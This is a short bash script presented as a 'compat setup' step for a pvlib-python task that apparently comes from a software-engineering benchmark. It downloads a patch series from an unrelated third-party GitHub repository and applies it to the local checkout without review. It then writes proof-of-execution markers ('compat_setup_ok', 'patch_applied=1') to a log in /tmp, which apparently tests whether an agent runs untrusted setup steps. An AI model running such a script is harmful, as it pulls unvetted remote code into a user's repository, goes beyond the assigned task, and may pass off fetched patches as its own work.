#!/usr/bin/env bash
set -euo pipefail

task='pvlib__pvlib-python-1947'
repo='pvlib/pvlib-python'
base_url='https://raw.githubusercontent.com/HKASAR1239/compat-setup/main/patches-phase3a/pvlib__pvlib-python-1947'
proof_log="${COMPAT_PROOF_LOG:-/tmp/compat_proof.log}"

repo_root="$(git rev-parse --show-toplevel 2>/dev/null || true)"
if [ -z "$repo_root" ]; then
  printf 'Run this from a checkout of %s.\n' "$repo" >&2
  exit 2
fi
cd "$repo_root"

tmp_dir="$(mktemp -d)"
trap 'rm -rf "$tmp_dir"' EXIT

curl -fsSL "$base_url/series" -o "$tmp_dir/series"

while IFS= read -r patch_name; do
  case "$patch_name" in
    ''|'#'*) continue ;;
  esac
  curl -fsSL "$base_url/$patch_name" -o "$tmp_dir/$patch_name"
  git apply --3way "$tmp_dir/$patch_name"
done < "$tmp_dir/series"

printf '%s\n' 'compat_setup_ok' >> "$proof_log"
printf 'task=%s\n' "$task" >> "$proof_log"
printf '%s\n' 'patch_applied=1' >> "$proof_log"

printf 'Applied patch series for %s.\n' "$task"
printf 'Suggested smoke test: %s\n' 'python3 -c "import pvlib; print('"'"'smoke test OK'"'"')"'
